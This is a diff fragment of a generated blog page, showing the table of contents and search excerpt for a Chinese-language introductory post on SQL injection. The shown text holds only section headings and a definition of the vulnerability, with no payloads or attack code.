class="toc-number">1.3.1.</span> <span class="toc-text">1.数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.搜索型注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">四.联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BC%96%E6%8F%92%E4%B8%80%E5%98%B4%EF%BC%9A%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">二编插一嘴：报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E6%94%AF%E6%8C%81"><span class="toc-number">1.5.1.</span> <span class="toc-text">原理支持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.</span> <span class="toc-text">五.盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.1.</span> <span class="toc-text">1.布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.2.</span> <span class="toc-text">2.时间盲注</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text"> 一.前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%AF%B9%E4%BA%8Esql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98"><span class="toc-number">1.2.</span> <span class="toc-text"> 二.对于SQL注入漏洞的挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%8F%AF%E8%83%BD%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.可能的注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2.漏洞检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text"> 三.常见的注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.搜索型注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text"> 四.联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BC%96%E6%8F%92%E4%B8%80%E5%98%B4%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text"> 二编插一嘴：报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E6%94%AF%E6%8C%81"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 原理支持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.</span> <span class="toc-text"> 五.盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 1.布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 2.时间盲注</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -652,7 +651,7 @@
           url: "https://cl1ck-t0.github.io/2025/12/29/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/",
           excerpt: "",
           description: "",
-          stripContent: "SQL注入一.前言SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型数据库（即SQL是一种数据库查询语言） 注入产生的原因是后台服务器在接收相关参数时未做好过滤直接带入",
+          stripContent: " SQL注入  一.前言 SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型数据库（即SQL是一种数据库查询语言） 注入产生的原因是后台服务器在接收相关参数时未做好过滤",
           date: "Mon Dec 29 2025 15:00:34 GMT+0800",
           updated: "Sun Feb 22 2026 21:32:45 GMT+0800",
           cover: "/images/banner.webp",
